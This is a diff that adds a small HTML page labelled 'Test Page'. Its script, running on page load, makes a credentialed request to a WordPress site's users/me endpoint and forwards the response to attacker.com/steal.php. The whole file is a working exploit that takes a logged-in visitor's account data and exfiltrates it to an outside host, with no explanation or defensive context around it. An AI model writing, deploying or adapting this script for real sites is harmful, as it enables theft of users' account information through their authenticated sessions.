@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        fetch("https://building-blocks.com/wp-json/wp/v2/users/me", {
+            credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+            fetch("https://attacker.com/steal.php?data=" + encodeURIComponent(data));
+        });
+    </script>
+</head>
+<body>
+    <h1>Test Page</h1>
+</body>
+</html>
